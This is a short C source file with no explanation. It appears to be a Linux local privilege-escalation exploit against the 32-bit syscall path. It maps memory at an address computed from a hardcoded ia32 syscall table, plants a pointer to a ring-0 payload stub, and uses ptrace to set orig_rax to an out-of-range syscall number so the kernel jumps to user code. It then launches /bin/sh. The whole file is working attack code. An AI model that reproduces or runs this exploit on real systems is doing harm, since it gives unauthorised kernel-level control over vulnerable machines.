#include <sys/ptrace.h>
#include <sys/user.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>
#include <stdio.h>
#include <sys/mman.h>
#include <string.h>
#include <stdlib.h>
#include <stddef.h>
#include <stdint.h>

// ia32_sys_call_table address (/proc/kallsyms)
#define syscall_table 0xffffffff8155b018
#define offset        (1L << 32)
#define landing       (syscall_table + 8*offset)

static void kernelmodecode(void) {
	// do something in ring0 here.
}


int main() {
        if((signed long)mmap((void*)(landing&~0xFFF), 4096,
                              PROT_READ|PROT_EXEC|PROT_WRITE,
                              MAP_FIXED|MAP_PRIVATE|MAP_ANONYMOUS,
                                0, 0) < 0) {
                perror("mmap");
                exit(-1);
        }
        *(long*)landing = (uint64_t)kernelmodecode;
        pid_t child;
        child = fork();
        if(child == 0) {
                ptrace(PTRACE_TRACEME, 0, NULL, NULL);
                kill(getpid(), SIGSTOP);
                __asm__("int $0x80\n");
                execl("/bin/sh", "/bin/sh", NULL);
        } else {
                wait(NULL);
                ptrace(PTRACE_SYSCALL, child, NULL, NULL);
                wait(NULL);
                ptrace(PTRACE_POKEUSER, child, offsetof(struct user, regs.orig_rax),
                        (void*)offset);
                ptrace(PTRACE_DETACH, child, NULL, NULL);
                wait(NULL);
        }
}

